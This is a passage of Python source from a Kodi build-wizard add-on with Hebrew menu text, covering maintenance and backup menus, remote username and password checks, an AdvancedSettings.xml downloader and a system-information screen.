		except: pass

def youtubeMenu(url=None):
	if not YOUTUBEFILE == 'http://':
		if url == None:
			YOUTUBEWORKING  = wiz.workingURL(YOUTUBEFILE)
			TEMPYOUTUBEFILE = uservar.YOUTUBEFILE
		else:
			YOUTUBEWORKING  = wiz.workingURL(url)
			TEMPYOUTUBEFILE = url
		if YOUTUBEWORKING == True:
			link = wiz.openURL(TEMPYOUTUBEFILE).replace('\n','').replace('\r','').replace('\t','')
			match = re.compile('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall(link)
			if len(match) > 0:
				for name, section, url, icon, fanart, description in match:
					if section.lower() == "yes":
						addDir ("[B]%s[/B]" % name, 'youtube', url, description=description, icon=icon, fanart=fanart, themeit=THEME3)
					else:
						addFile(name, 'viewVideo', url=url, description=description, icon=icon, fanart=fanart, themeit=THEME2)
			else: wiz.log("[YouTube Menu] ERROR: Invalid Format.")
		else: 
			wiz.log("[YouTube Menu] ERROR: URL for YouTube list not working.")
			addFile('Url for txt file not valid', '', themeit=THEME3)
			addFile('%s' % YOUTUBEWORKING, '', themeit=THEME3)
	else: wiz.log("[YouTube Menu] No YouTube list added.")
	setView('files', 'viewType')
def STARTP():
	input= (ADDON.getSetting("pass"))
	if BUILDNAME == "":
	 if not NOTIFY == 'true':
          url = wiz.workingURL(NOTIFICATION)
	 if not NOTIFY2 == 'true':
          url = wiz.workingURL(NOTIFICATION2)
	 if not NOTIFY3 == 'true':
          url = wiz.workingURL(NOTIFICATION3)
	search_entered =input
	url = urllib2.Request(SPEED)
	remote_file = urllib2.urlopen(url)
	#x=remote_file.read()
	x=remote_file.readlines()
#	if input==search_entered:
#				url=list
#				if search_entered!=x:
	found=0
	for us in x:
		if us.split(' ==')[0] ==input or us.split()[0]==input:
			found=1
			break
	if found==0:
					yes = DIALOG.yesno("%s" % ADDONTITLE, "[COLOR %s]הסיסמה אינה נכונה," % (COLOR2), "הכנס את הסיסמה כעת[/COLOR]", nolabel='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel='[B][COLOR green]אישור[/COLOR][/B]')

					if yes:
						#setpass()
						ADDON.openSettings()
						# STARTP()
						sys.exit()
					else:
						sys.exit()
#	else:
#		xbmcgui.Dialog().ok('הקוד שלך','עבר')
#		sys.exit()
	return 'ok'
def STARTP2():
	input= (ADDON.getSetting("user"))
#	search_entered =input
	url = (UNAME)
	remote_file = urllib2.urlopen(url)
	x=remote_file.readlines()
	found=0
	
#	if not input +'\r\n' in x:
	for us in x:
		if us.split(' ==')[0] ==input or us.split()[0]==input:
			found=1
			break
	if found==0:
		yes = DIALOG.yesno("%s" % ADDONTITLE, "[COLOR %s]שם המתשמש שהוכנס אינו נכון," % (COLOR2), "הכנס את שם המשתמש כעת[/COLOR]", nolabel='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel='[B][COLOR green]אישור[/COLOR][/B]')

		if yes:
#			setuname()
			ADDON.openSettings()
	#		sys.exit()
			# STARTP2()
			sys.exit()
		else:
			sys.exit()
#	else:
#		xbmcgui.Dialog().ok('הקוד שלך','עבר')
#		sys.exit()
	return 'ok'
def passandpin():
	addFile('קבל קוד אימות'   , 'getpass', name, 'getpass'  , themeit=THEME1)
	addFile('הכנס שם משתמש'   , 'setuname', name, 'setuname'  ,  themeit=THEME1)
	addFile('הכנס סיסמה'   , 'setpass', name, 'setpass'  ,  themeit=THEME1)
def passandUsername():
    
	ADDON.openSettings()
#	setuname()
#	setpass()
def folderback():
    path=ADDON.getSetting("path")
    if path:
      path = xbmcgui.Dialog().browse(0,"בחר תקייה", 'files','',False,False, HOME)
      ADDON.setSetting("path",path)

    
def backmyupbuild():
#	maint       = 'true' if SHOWMAINT      == 'true' else 'false'
#	addDir ('[B]שחזור וגיבוי[/B]'     ,'maint', 'backup',   icon=ICONMAINT, themeit=THEME1)
#	if view == "backup" or SHOWMAINT == 'true':
		addFile('מחק את תיקיית הגיבוי שלי',        'clearbackup',     icon=ICONMAINT,   themeit=THEME3)
		addFile('[COLOR %s]%s[/COLOR]מיקום גיבוי: ' % (COLOR2, MYBUILDS),'folderback', 'Maintenance', icon=ICONMAINT, themeit=THEME3)
		addFile('גיבוי בילד שלם',               'backupbuild',     icon=ICONMAINT,   themeit=THEME3)
#		addFile('[גיבוי]: פרופילים',              'backupgui',       icon=ICONMAINT,   themeit=THEME3)
		# addFile('גיבוי הגדרות סקין ותפריטים בלבד',               'backuptheme',     icon=ICONMAINT,   themeit=THEME3)
		addFile('גיבוי הגדרות',          'backupaddon',     icon=ICONMAINT,   themeit=THEME3)
		addFile('שחזור בילד שלם',         'restorezip',      icon=ICONMAINT,   themeit=THEME3)
#		addFile('[שחזור]: פרופילים מתיקיה מקומית',        'restoregui',      icon=ICONMAINT,   themeit=THEME3)
		addFile('שחזור הגדרות',    'restoreaddon',    icon=ICONMAINT,   themeit=THEME3)
#		addFile('[שחזור]: בילד מתיקיה חיצונית',      'restoreextzip',   icon=ICONMAINT,   themeit=THEME3)
#		addFile('[שחזור]: פרופילים מתיקיה חיצונית',     'restoreextgui',   icon=ICONMAINT,   themeit=THEME3)
#		addFile('[שחזור]: אדון דאטה מתיקיה חיצונית', 'restoreextaddon', icon=ICONMAINT,   themeit=THEME3)
def maintMenu(view=None):

	on = '[B][COLOR green]ON[/COLOR][/B]'; off = '[B][COLOR red]OFF[/COLOR][/B]'
	autoclean   = 'true' if AUTOCLEANUP    == 'true' else 'false'
	cache       = 'true' if AUTOCACHE      == 'true' else 'false'
	packages    = 'true' if AUTOPACKAGES   == 'true' else 'false'
	thumbs      = 'true' if AUTOTHUMBS     == 'true' else 'false'
	maint       = 'true' if SHOWMAINT      == 'true' else 'false'
	includevid  = 'true' if INCLUDEVIDEO   == 'true' else 'false'
	includeall  = 'true' if INCLUDEALL     == 'true' else 'false'
	thirdparty  = 'true' if THIRDPARTY     == 'true' else 'false'
	if wiz.Grab_Log(True) == False: kodilog = 0
	else: kodilog = errorChecking(wiz.Grab_Log(True), True, True)
	if wiz.Grab_Log(True, True) == False: kodioldlog = 0
	else: kodioldlog = errorChecking(wiz.Grab_Log(True,True), True, True)
	errorsinlog = int(kodilog) + int(kodioldlog)
	errorsfound = str(errorsinlog) + ' Error(s) Found' if errorsinlog > 0 else 'None Found'
	wizlogsize = ': [COLOR red]Not Found[/COLOR]' if not os.path.exists(WIZLOG) else ": [COLOR green]%s[/COLOR]" % wiz.convertSize(os.path.getsize(WIZLOG))
	if includeall == 'true':
		includebob = 'true'
		includepho = 'true'
		includespe = 'true'
		includegen = 'true'
		includeexo = 'true'
		includeone = 'true'
		includesal = 'true'
		includeshd = 'true'
	else:
		includebob = 'true' if INCLUDEBOB     == 'true' else 'false'
		includepho = 'true' if INCLUDEPHOENIX == 'true' else 'false'
		includespe = 'true' if INCLUDESPECTO  == 'true' else 'false'
		includegen = 'true' if INCLUDEGENESIS == 'true' else 'false'
		includeexo = 'true' if INCLUDEEXODUS  == 'true' else 'false'
		includeone = 'true' if INCLUDEONECHAN == 'true' else 'false'
		includesal = 'true' if INCLUDESALTS   == 'true' else 'false'
		includeshd = 'true' if INCLUDESALTSHD == 'true' else 'false'
	sizepack   = wiz.getSize(PACKAGES)
	sizethumb  = wiz.getSize(THUMBS)
	sizecache  = wiz.getCacheSize()
	totalsize  = sizepack+sizethumb+sizecache
	feq        = ['Daily', 'Always', '3 Days', 'Weekly']
	addDir ('[B]Cleaning Tools[/B]'       ,'maint', 'clean',  icon=ICONMAINT, themeit=THEME1)
	if view == "clean" or SHOWMAINT == 'true': 
		addFile('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]' % wiz.convertSize(totalsize)  ,'fullclean',       icon=ICONMAINT, themeit=THEME3)
		addFile('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]' % wiz.convertSize(sizecache)     ,'clearcache',      icon=ICONMAINT, themeit=THEME3)
		addFile('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]' % wiz.convertSize(sizepack)   ,'clearpackages',   icon=ICONMAINT, themeit=THEME3)
		addFile('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]' % wiz.convertSize(sizethumb),'clearthumb',      icon=ICONMAINT, themeit=THEME3)
		addFile('ניקוי תמונות ישנות', 'oldThumbs',      icon=ICONMAINT, themeit=THEME3)
		addFile('ניקוי קאש לוג',               'clearcrash',      icon=ICONMAINT, themeit=THEME3)
		addFile('ניקוי חבילות ישנות',                'purgedb',         icon=ICONMAINT, themeit=THEME3)
		addFile('התקנה נקיה',                    'freshstart',      icon=ICONMAINT, themeit=THEME3)
	addDir ('[B]Addon Tools[/B]',       'maint', 'addon',  icon=ICONMAINT, themeit=THEME1)
	if view == "addon" or SHOWMAINT == 'false': 
		addFile('הסרת הרחבות',                  'removeaddons',    icon=ICONMAINT, themeit=THEME3)
		addDir ('הסרת מידע הרחבות',              'removeaddondata', icon=ICONMAINT, themeit=THEME3)
		addDir ('הפעלה או ביטול הרחבות',          'enableaddons',    icon=ICONMAINT, themeit=THEME3)
		addFile('Enable/Disable Adult Addons',    'toggleadult',     icon=ICONMAINT, themeit=THEME3)
		addFile('בודק עדכונים',            'forceupdate',     icon=ICONMAINT, themeit=THEME3)
		addFile('Hide Passwords On Keyboard Entry',   'hidepassword',   icon=ICONMAINT, themeit=THEME3)
		addFile('Unhide Passwords On Keyboard Entry', 'unhidepassword', icon=ICONMAINT, themeit=THEME3)
	addDir ('[B]Misc Maintenance[/B]'     ,'maint', 'misc',   icon=ICONMAINT, themeit=THEME1)
	if view == "misc" or SHOWMAINT == 'true': 
		addFile('Kodi 17 Fix',                    'kodi17fix',       icon=ICONMAINT, themeit=THEME3)
		addFile('Reload Skin',                    'forceskin',       icon=ICONMAINT, themeit=THEME3)
		addFile('Reload Profile',                 'forceprofile',    icon=ICONMAINT, themeit=THEME3)
		addFile('Force Close Kodi',               'forceclose',      icon=ICONMAINT, themeit=THEME3)
		addFile('Upload Kodi.log',                'uploadlog',       icon=ICONMAINT, themeit=THEME3)
		addFile('View Errors in Log: %s' % (errorsfound), 'viewerrorlog',    icon=ICONMAINT, themeit=THEME3)
		addFile('View Log File',                  'viewlog',         icon=ICONMAINT, themeit=THEME3)
		addFile('View Wizard Log File',           'viewwizlog',      icon=ICONMAINT, themeit=THEME3)
		addFile('Clear Wizard Log File%s' % wizlogsize,'clearwizlog',     icon=ICONMAINT, themeit=THEME3)
	addDir ('[B]שחזור וגיבוי[/B]'     ,'maint', 'backup',   icon=ICONMAINT, themeit=THEME1)
	if view == "backup" or SHOWMAINT == 'true':
		addFile('Clean Up Back Up Folder',        'clearbackup',     icon=ICONMAINT,   themeit=THEME3)
		addFile('Back Up Location: [COLOR %s]%s[/COLOR]' % (COLOR2, MYBUILDS),'settings', 'Maintenance', icon=ICONMAINT, themeit=THEME3)
		addFile('[גיבוי]: בילד',               'backupbuild',     icon=ICONMAINT,   themeit=THEME3)
		addFile('[גיבוי]: פרופילים',              'backupgui',       icon=ICONMAINT,   themeit=THEME3)
		addFile('[גיבוי]: סקינים',               'backuptheme',     icon=ICONMAINT,   themeit=THEME3)
		addFile('[גיבוי]: אדון דאטה',          'backupaddon',     icon=ICONMAINT,   themeit=THEME3)
		addFile('[שחזור]: בילד מתיקיה מקומית',         'restorezip',      icon=ICONMAINT,   themeit=THEME3)
		addFile('[שחזור]: פרופילים מתיקיה מקומית',        'restoregui',      icon=ICONMAINT,   themeit=THEME3)
		addFile('[שחזור]: אדון דאטה מתיקיה מקומית',    'restoreaddon',    icon=ICONMAINT,   themeit=THEME3)
		addFile('[שחזור]: בילד מתיקיה חיצונית',      'restoreextzip',   icon=ICONMAINT,   themeit=THEME3)
		addFile('[שחזור]: פרופילים מתיקיה חיצונית',     'restoreextgui',   icon=ICONMAINT,   themeit=THEME3)
		addFile('[שחזור]: אדון דאטה מתיקיה חיצונית', 'restoreextaddon', icon=ICONMAINT,   themeit=THEME3)
	addDir ('[B]System Tweaks/Fixes[/B]',       'maint', 'tweaks', icon=ICONMAINT, themeit=THEME1)
	if view == "tweaks" or SHOWMAINT == 'true': 
		if not ADVANCEDFILE == 'http://' and not ADVANCEDFILE == '':
			addDir ('Advanced Settings',            'advancedsetting',  icon=ICONMAINT, themeit=THEME3)
		else: 
			if os.path.exists(ADVANCED):
				addFile('View Currect AdvancedSettings.xml',   'currentsettings', icon=ICONMAINT, themeit=THEME3)
				addFile('Remove Currect AdvancedSettings.xml', 'removeadvanced',  icon=ICONMAINT, themeit=THEME3)
			addFile('Quick Configure AdvancedSettings.xml',    'autoadvanced',    icon=ICONMAINT, themeit=THEME3)
		addFile('Scan Sources for broken links',  'checksources',    icon=ICONMAINT, themeit=THEME3)
		addFile('Scan For Broken Repositories',   'checkrepos',      icon=ICONMAINT, themeit=THEME3)
		addFile('Fix Addons Not Updating',        'fixaddonupdate',  icon=ICONMAINT, themeit=THEME3)
		addFile('Remove Non-Ascii filenames',     'asciicheck',      icon=ICONMAINT, themeit=THEME3)
		addFile('Convert Paths to special',       'convertpath',     icon=ICONMAINT, themeit=THEME3)
		addDir ('System Information',             'systeminfo',      icon=ICONMAINT, themeit=THEME3)
	addFile('Show All Maintenance: %s' % maint.replace('true',on).replace('false',off) ,'togglesetting', 'showmaint', icon=ICONMAINT, themeit=THEME2)
	addDir ('[I]<< Return to Main Menu[/I]', icon=ICONMAINT, themeit=THEME2)
	addFile('Third Party Wizards: %s' % thirdparty.replace('true',on).replace('false',off) ,'togglesetting', 'enable3rd', fanart=FANART, icon=ICONMAINT, themeit=THEME1)
	if thirdparty == 'true':
		first = THIRD1NAME if not THIRD1NAME == '' else 'Not Set'
		secon = THIRD2NAME if not THIRD2NAME == '' else 'Not Set'
		third = THIRD3NAME if not THIRD3NAME == '' else 'Not Set'
		addFile('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]' % (COLOR2, first), 'editthird', '1', icon=ICONMAINT, themeit=THEME3)
		addFile('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]' % (COLOR2, secon), 'editthird', '2', icon=ICONMAINT, themeit=THEME3)
		addFile('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]' % (COLOR2, third), 'editthird', '3', icon=ICONMAINT, themeit=THEME3)
	addFile('ניקוי אוטומטי', '', fanart=FANART, icon=ICONMAINT, themeit=THEME1)
	addFile('ניקוי אוטומטי בהפעלה: %s' % autoclean.replace('true',on).replace('false',off) ,'togglesetting', 'autoclean',   icon=ICONMAINT, themeit=THEME3)
	if autoclean == 'true':
		addFile('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]' % feq[AUTOFEQ], 'changefeq', icon=ICONMAINT, themeit=THEME3)
		addFile('--- ניקוי קאש בהפעלה: %s' % cache.replace('true',on).replace('false',off), 'togglesetting', 'clearcache', icon=ICONMAINT, themeit=THEME3)
		addFile('--- ניקוי חבילות בהפעלה: %s' % packages.replace('true',on).replace('false',off), 'togglesetting', 'clearpackages', icon=ICONMAINT, themeit=THEME3)
		addFile('--- ניקוי תמונות ישנות בהפעלה: %s' % thumbs.replace('true',on).replace('false',off), 'togglesetting', 'clearthumbs', icon=ICONMAINT, themeit=THEME3)
	addFile('ניקוי וידאו קאש', '', fanart=FANART, icon=ICONMAINT, themeit=THEME1)
	addFile('Include Video Cache in Clear Cache: %s' % includevid.replace('true',on).replace('false',off), 'togglecache', 'includevideo', icon=ICONMAINT, themeit=THEME3)
	if includevid == 'true':
		addFile('--- Include All Video Addons: %s' % includeall.replace('true',on).replace('false',off), 'togglecache', 'includeall', icon=ICONMAINT, themeit=THEME3)
		addFile('--- Include Bob: %s' % includebob.replace('true',on).replace('false',off), 'togglecache', 'includebob', icon=ICONMAINT, themeit=THEME3)
		addFile('--- Include Phoenix: %s' % includepho.replace('true',on).replace('false',off), 'togglecache', 'includephoenix', icon=ICONMAINT, themeit=THEME3)
		addFile('--- Include Specto: %s' % includespe.replace('true',on).replace('false',off), 'togglecache', 'includespecto', icon=ICONMAINT, themeit=THEME3)
		addFile('--- Include Exodus: %s' % includeexo.replace('true',on).replace('false',off), 'togglecache', 'includeexodus', icon=ICONMAINT, themeit=THEME3)
		addFile('--- Include Salts: %s' % includesal.replace('true',on).replace('false',off), 'togglecache', 'includesalts', icon=ICONMAINT, themeit=THEME3)
		addFile('--- Include Salts HD Lite: %s' % includeshd.replace('true',on).replace('false',off), 'togglecache', 'includesaltslite', icon=ICONMAINT, themeit=THEME3)
		addFile('--- Include One Channel: %s' % includeone.replace('true',on).replace('false',off), 'togglecache', 'includeonechan', icon=ICONMAINT, themeit=THEME3)
		addFile('--- Include Genesis: %s' % includegen.replace('true',on).replace('false',off), 'togglecache', 'includegenesis', icon=ICONMAINT, themeit=THEME3)
		addFile('--- Enable All Video Addons', 'togglecache', 'true', icon=ICONMAINT, themeit=THEME3)
		addFile('--- Disable All Video Addons', 'togglecache', 'false', icon=ICONMAINT, themeit=THEME3)
	setView('files', 'viewType')

def advancedWindow(url=None):
	if not ADVANCEDFILE == 'http://':
		if url == None:
			ADVANCEDWORKING = wiz.workingURL(ADVANCEDFILE)
			TEMPADVANCEDFILE = uservar.ADVANCEDFILE
		else:
			ADVANCEDWORKING  = wiz.workingURL(url)
			TEMPADVANCEDFILE = url
		addFile('Quick Configure AdvancedSettings.xml', 'autoadvanced', icon=ICONMAINT, themeit=THEME3)
		if os.path.exists(ADVANCED): 
			addFile('View Currect AdvancedSettings.xml', 'currentsettings', icon=ICONMAINT, themeit=THEME3)
			addFile('Remove Currect AdvancedSettings.xml', 'removeadvanced',  icon=ICONMAINT, themeit=THEME3)
		if ADVANCEDWORKING == True:
			if HIDESPACERS == 'No': addFile(wiz.sep(), '', icon=ICONMAINT, themeit=THEME3)
			link = wiz.openURL(TEMPADVANCEDFILE).replace('\n','').replace('\r','').replace('\t','')
			match = re.compile('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall(link)
			if len(match) > 0:
				for name, section, url, icon, fanart, description in match:
					if section.lower() == "yes":
						addDir ("[B]%s[/B]" % name, 'advancedsetting', url, description=description, icon=icon, fanart=fanart, themeit=THEME3)
					else:
						addFile(name, 'writeadvanced', name, url, description=description, icon=icon, fanart=fanart, themeit=THEME2)
			else: wiz.log("[Advanced Settings] ERROR: Invalid Format.")
		else: wiz.log("[Advanced Settings] URL not working: %s" % ADVANCEDWORKING)
	else: wiz.log("[Advanced Settings] not Enabled")

def writeAdvanced(name, url):
	ADVANCEDWORKING = wiz.workingURL(url)
	if ADVANCEDWORKING == True:
		if os.path.exists(ADVANCED): choice = DIALOG.yesno(ADDONTITLE, "[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]" % (COLOR2, COLOR1, name), yeslabel="[B][COLOR green]Overwrite[/COLOR][/B]", nolabel="[B][COLOR red]Cancel[/COLOR][/B]")
		else: choice = DIALOG.yesno(ADDONTITLE, "[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]" % (COLOR2, COLOR1, name), yeslabel="[B][COLOR green]התקנה[/COLOR][/B]", nolabel="[B][COLOR red]ביטול[/COLOR][/B]")

		if choice == 1:
			file = wiz.openURL(url)
			f = open(ADVANCED, 'w'); 
			f.write(file)
			f.close()
			DIALOG.ok(ADDONTITLE, '[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]' % COLOR2)
			wiz.killxbmc(True)
		else: wiz.log("[Advanced Settings] install canceled"); wiz.LogNotify('[COLOR %s]%s[/COLOR]' % (COLOR1, ADDONTITLE), "[COLOR %s]Write Cancelled![/COLOR]" % COLOR2); return
	else: wiz.log("[Advanced Settings] URL not working: %s" % ADVANCEDWORKING); wiz.LogNotify('[COLOR %s]%s[/COLOR]' % (COLOR1, ADDONTITLE), "[COLOR %s]URL Not Working[/COLOR]" % COLOR2)

def viewAdvanced():
	f = open(ADVANCED)
	a = f.read().replace('\t', '    ')
	wiz.TextBox(ADDONTITLE, a)
	f.close()

def removeAdvanced():
	if os.path.exists(ADVANCED):
		wiz.removeFile(ADVANCED)
	else: LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]AdvancedSettings.xml not found[/COLOR]")

def showAutoAdvanced():
	notify.autoConfig()

def getIP():
	site  = 'http://whatismyipaddress.com/'
	if not wiz.workingURL(site): return 'Unknown', 'Unknown', 'Unknown'
	page  = wiz.openURL(site).replace('\n','').replace('\r','')
	if not 'Access Denied' in page:
		ipmatch   = re.compile('whatismyipaddress.com/ip/(.+?)"').findall(page)
		ipfinal   = ipmatch[0] if (len(ipmatch) > 0) else 'Unknown'
		details   = re.compile('"font-size:14px;">(.+?)</td>').findall(page)
		provider  = details[0] if (len(details) > 0) else 'Unknown'
		location  = details[1]+', '+details[2]+', '+details[3] if (len(details) > 2) else 'Unknown'
		return ipfinal, provider, location
	else: return 'Unknown', 'Unknown', 'Unknown'

def systemInfo():
	infoLabel = ['System.FriendlyName', 
				 'System.BuildVersion', 
				 'System.CpuUsage',
				 'System.ScreenMode',
				 'Network.IPAddress',
				 'Network.MacAddress',
				 'System.Uptime',
				 'System.TotalUptime',
				 'System.FreeSpace',
				 'System.UsedSpace',
				 'System.TotalSpace',
				 'System.Memory(free)',
				 'System.Memory(used)',
				 'System.Memory(total)']
	data      = []; x = 0
	for info in infoLabel:
		temp = wiz.getInfo(info)
		y = 0
		while temp == "Busy" and y < 10:
			temp = wiz.getInfo(info); y += 1; wiz.log("%s sleep %s" % (info, str(y))); xbmc.sleep(1000)
		data.append(temp)
		x += 1
	storage_free  = data[8] if 'Una' in data[8] else wiz.convertSize(int(float(data[8][:-8]))*1024*1024)
	storage_used  = data[9] if 'Una' in data[9] else wiz.convertSize(int(float(data[9][:-8]))*1024*1024)
	storage_total = data[10] if 'Una' in data[10] else wiz.convertSize(int(float(data[10][:-8]))*1024*1024)
	ram_free      = wiz.convertSize(int(float(data[11][:-2]))*1024*1024)
	ram_used      = wiz.convertSize(int(float(data[12][:-2]))*1024*1024)
	ram_total     = wiz.convertSize(int(float(data[13][:-2]))*1024*1024)
	exter_ip, provider, location = getIP()
	
	picture = []; music = []; video = []; programs = []; repos = []; scripts = []; skins = []
	
	fold = glob.glob(os.path.join(ADDONS, '*/'))
	for folder in sorted(fold, key = lambda x: x):
		foldername = os.path.split(folder[:-1])[1]
		if foldername == 'packages': continue
		xml = os.path.join(folder, 'addon.xml')
		if os.path.exists(xml):
			f      = open(xml)
			a      = f.read()
			prov   = re.compile("<provides>(.+?)</provides>").findall(a)
			if len(prov) == 0:
				if foldername.startswith('skin'): skins.append(foldername)
				if foldername.startswith('repo'): repos.append(foldername)
				else: scripts.append(foldername)
			elif not (prov[0]).find('executable') == -1: programs.append(foldername)
			elif not (prov[0]).find('video') == -1: video.append(foldername)
			elif not (prov[0]).find('audio') == -1: music.append(foldername)
			elif not (prov[0]).find('image') == -1: picture.append(foldername)

	addFile('[B]Media Center Info:[/B]', '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, data[0]), '', icon=ICONMAINT, themeit=THEME3)
	addFile('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, data[1]), '', icon=ICONMAINT, themeit=THEME3)
	addFile('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, wiz.platform().title()), '', icon=ICONMAINT, themeit=THEME3)
	addFile('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, data[2]), '', icon=ICONMAINT, themeit=THEME3)
	addFile('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, data[3]), '', icon=ICONMAINT, themeit=THEME3)
	
	addFile('[B]Uptime:[/B]', '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, data[6]), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, data[7]), '', icon=ICONMAINT, themeit=THEME2)
	
	addFile('[B]Local Storage:[/B]', '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, storage_free), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, storage_used), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, storage_total), '', icon=ICONMAINT, themeit=THEME2)
	
	addFile('[B]Ram Usage:[/B]', '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, ram_free), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, ram_used), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, ram_total), '', icon=ICONMAINT, themeit=THEME2)
	
	addFile('[B]Network:[/B]', '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, data[4]), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, exter_ip), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, provider), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, location), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, data[5]), '', icon=ICONMAINT, themeit=THEME2)
	
	totalcount = len(picture) + len(music) + len(video) + len(programs) + len(scripts) + len(skins) + len(repos) 
	addFile('[B]Addons([COLOR %s]%s[/COLOR]):[/B]' % (COLOR1, totalcount), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, str(len(video))), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, str(len(programs))), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, str(len(music))), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, str(len(picture))), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, str(len(repos))), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, str(len(skins))), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, str(len(scripts))), '', icon=ICONMAINT, themeit=THEME2)
def Menu():
	addDir ('אפשרויות נוספות'   ,'mor',   icon=ICONSAVE,   themeit=THEME1)

def saveMenu():

	on = '[COLOR yellow]מופעל[/COLOR]'; off = '[COLOR blue]מבוטל[/COLOR]'
	wall       = 'true' if KEEPMOVIEWALL == 'true' else 'false'
	list       = 'true' if KEEPMOVIELIST == 'true' else 'false'
	info       = 'true' if KEEPINFO      == 'true' else 'false'
	#thumb      = 'true' if KEEPTHUMBNAILS == 'true' else 'false'
	sound      = 'true' if KEEPSOUND     == 'true' else 'false'
	view       = 'true' if KEEPVIEW      == 'true' else 'false'
	skin       = 'true' if KEEPSKIN      == 'true' else 'false'
	skin2      = 'true' if KEEPSKIN2     == 'true' else 'false'
	skin3      = 'true' if KEEPSKIN3     == 'true' else 'false'
	addons     = 'true' if KEEPADDONS    == 'true' else 'false'
	pvr        = 'true' if KEEPPVR       == 'true' else 'false'
	tvlist     = 'true' if KEEPTVLIST    == 'true' else 'false'
	hubmovie    = 'true' if KEEPHUBMOVIE  == 'true' else 'false'
	hubtvshow  = 'true' if KEEPHUBTVSHOW == 'true' else 'false'
	hubtv      = 'true' if KEEPHUBTV     == 'true' else 'false'
	hubvod     = 'true' if KEEPHUBVOD    == 'true' else 'false'
	hubsport   = 'true' if KEEPHUBSPORT  == 'true' else 'false'
	hubkids    = 'true' if KEEPHUBKIDS   == 'true' else 'false'
	hubmusic   = 'true' if KEEPHUBMUSIC  == 'true' else 'false'
	hubmenu    = 'true' if KEEPHUBMENU   == 'true' else 'false'
	plist      = 'true' if KEEPPLAYLIST  == 'true' else 'false'
	trakt      = 'true' if KEEPTRAKT     == 'true' else 'false'
	real       = 'true' if KEEPREAL      == 'true' else 'false'
